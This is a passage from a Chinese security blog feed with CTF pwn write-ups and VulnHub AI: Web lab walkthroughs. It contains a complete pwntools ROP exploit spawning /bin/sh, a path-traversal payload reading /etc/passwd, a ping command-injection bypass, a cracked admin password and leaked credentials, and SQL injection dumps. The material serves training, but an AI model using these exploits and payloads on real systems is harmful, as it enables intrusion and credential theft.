punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch的话，我首先的思路是限制 memcpy 读入为一个定值，但是死活过不掉check<br><img src="/EXP_FILE/704dfb3bbb15aeedd79bdb4d09416ffa_MD5.jpeg"><br>想想索性直接把memcpy删掉，改下puts的参数为rcx，不影响正常服务<br><img src="/EXP_FILE/703afa5a3337bdd51e4d53d2faa6db76_MD5.jpeg"><br><img src="/EXP_FILE/af47872762f6925e6788a8a4856389dc_MD5.jpeg"></p><h1 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h1><p>go语言静态小程序，有栈溢出。（ciscn对go情有独钟吗）</p><p>走open_syscall在bss上写binsh，然后execve_syscall即可，只是寄存器的gadget难找一些</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your choice > '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input new content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>bss<span class="token operator">=</span><span class="token number">0x527000</span><span class="token operator">+</span><span class="token number">0x2000</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000462946</span>rsi_rsp_0xf8_rbp<span class="token operator">=</span><span class="token number">0x0000000000462552</span>rdx<span class="token operator">=</span><span class="token number">0x000000000047a8fa</span>rax_rbp<span class="token operator">=</span><span class="token number">0x0000000000404408</span>syscall<span class="token operator">=</span><span class="token number">0x000000000040316C</span>sadd<span class="token punctuation">(</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x000000000047F41E'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x40</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rax_rbp<span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'note'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch的话，把循环改成定值就过check了<br><img src="/EXP_FILE/e148411ef445b5c558fb60fb7ef80bb4_MD5.jpeg"></p><h1 id="staticlink"><a href="#staticlink" class="headerlink" title="staticlink"></a>staticlink</h1><p>我是懒狗，懒得看了</p>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_2</title>
      <link href="/2024/06/06/Easy-AI_Web_2/"/>
      <url>/2024/06/06/Easy-AI_Web_2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/ai-web-2,357/">AI: Web: 2 ~ VulnHub</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/Rxi134_FILE/9c5e37455a54f557b07e1321cb8da7a3_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Rxi134_FILE/945949733b182b78582a5e5d68a3f829_MD5.jpeg"></p><p>是个登录界面<br><img src="/Rxi134_FILE/9347ffe79c10443dde93f42085eef40f_MD5.jpeg"><br>可以注册进去<br><img src="/Rxi134_FILE/b3046717c69370c5f1f12ca23806c12e_MD5.jpeg"><br>XuezhuLi FileSharing？搜索一下有目录遍历<br><img src="/Rxi134_FILE/5deba8eebc0a0719dd778dd1d100764c_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这边扫下目录，正好扫到一个download.php，直接利用</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a07934496e60f968e52cd7884bb8d5c5_MD5.jpeg"><br>成功触发</p><p>但是不能读取&#x2F;etc&#x2F;shadow，id_rsa也不行</p><p>扫一下目录，有一个&#x2F;webadmin&#x2F;需要密码<br><img src="/Rxi134_FILE/bec81bac25c350fa5a530054d13bbe3d_MD5.jpeg"></p><p>这个服务器是Apache HTTP Server，允许使用 HTTP 身份验证，密码文件位于<code>/etc/apache2/.htpasswd</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>属于md5，john破解出hash<br><img src="/Rxi134_FILE/7419798ceec3ad0112281f72729c3a5d_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:c.ronaldo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录进入&#x2F;webadmin&#x2F;<br><img src="/Rxi134_FILE/27fbb8a153d352c15422b4c420687aaf_MD5.jpeg"></p><p>放上cookie继续扫，能访问到robots.txt<br><img src="/Rxi134_FILE/f358315b7e90455658ff374606383458_MD5.jpeg"></p><p>访问&#x2F;webadmin&#x2F;H05Tpin9555&#x2F;，实现了ping功能<br><img src="/Rxi134_FILE/a39c6ceff9e50aaf13161385404d1f61_MD5.jpeg"></p><p>尝试命令执行，发现 || 可以绕过<br><img src="/Rxi134_FILE/5295f88ef31eb5b041714694407a4b41_MD5.jpeg"><br>经过尝试，过滤了<code>&amp; ; -</code></p><p>我们处于<code>/var/www/html/webadmin/H05Tpin9555</code>目录下，用户为 www-data</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/var/www/html/webadmin/H05Tpin9555</span>index.phpstyle-main.css<span class="token comment">#/var/www/html/webadmin/S0mextras</span>index.html<span class="token comment">#/var/www/html/webadmin/</span>H05Tpin9555S0mextrasindex.htmlrobots.txt<span class="token comment">#/var/www/html/</span>cssdeleting.phpdownload.phpindex.phplogout.phpsignup.phpsrvuserpage.phpviewing.phpwebadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并没有什么可用的</p><p>卡住了，查看wp，有隐藏文件，但是<code>-</code>被过滤了不能使用 ls -a</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1 <span class="token operator">||</span> <span class="token function">ls</span> <span class="token punctuation">..</span>/S0mextras/.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以看到隐藏文件了<br><img src="/Rxi134_FILE/cd36ef267539b9b3147784a9fe5f1760_MD5.jpeg"></p><p>这是其中一个用户的账密<br><img src="/Rxi134_FILE/f5a521171b4a7f2fe287b9d4021a4eef_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User: n0nr00tuserCred: zxowieoi4sdsadpEClDws1sf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/6e56723323db67af7d4463aad8e44647_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹到meterpreter吧</p><p>没找到好用的，frp转发下端口，ubuntu18 直接pwnkit一把嗦<br><img src="/Rxi134_FILE/d7c0404ee4304956624af50b1b47c0e8_MD5.jpeg"><br><img src="/Rxi134_FILE/fa8ba88e130e5ac0efd4dcc1b02ea409_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p><ul><li>更加深入的理解了msf</li></ul>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_1</title>
      <link href="/2024/06/05/Easy-AI_Web_1/"/>
      <url>/2024/06/05/Easy-AI_Web_1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>额外设置了个跳板机，更接近现实<br><img src="/Rxi134_FILE/fc8a796b7c75ecb02200f2bbf5d32d55_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>扫下端口<br><img src="/Rxi134_FILE/7b75f0a6b36b30a6433a6ef27c967f90_MD5.jpeg"></p><p>访问网站页面，只有一行字<br><img src="/Rxi134_FILE/938b9d2811e2b344493418a36a37ae63_MD5.jpeg"></p><p>dirsearch扫目录只扫出个&#x2F;robots.txt</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User-agent: *Disallow: Disallow: /m3diNf0/Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问都是403，拿着 &#x2F;m3diNf0&#x2F; 和 &#x2F;se3reTdir777&#x2F; 继续扫</p><p>扫到  &#x2F;m3diNf0&#x2F;info.php，是一个phpinfo界面<br><img src="/Rxi134_FILE/e895abffb33d61ed10fb573347745eea_MD5.jpeg"><br>这时候想了一下会不会有XXE，但是libxml 2.9.4默认不解析外部实体<br><img src="/Rxi134_FILE/8b7947f4287429e7b16227d7f2fdf36f_MD5.jpeg"></p><p>扫  &#x2F;se3reTdir777&#x2F; 只有一个index.php<br><img src="/Rxi134_FILE/20223847dc332295b9557c3db09dfd12_MD5.jpeg"><br>这像是一个通过ID查询用户的系统<br><img src="/Rxi134_FILE/f450c481b54ad47b43c0c91ecfdd8de1_MD5.jpeg"></p><p>与数据库有交集，试试看有没有注入点<br><img src="/Rxi134_FILE/0cd126a50fdd43a0923edea5fbcc2f46_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">available databases [2]:[*] aiweb1[*] information_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Database: aiweb1[2 tables]+------------+| user       || systemUser |+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Table: user[3 entries]+----+----------+-----------+| id | lastName | firstName |+----+----------+-----------+| 1  | admin    | admin     || 2  | root     | root      || 3  | mysql    | mysql     |+----+----------+-----------++----+----------------------------------------------+-----------+| id | password                                     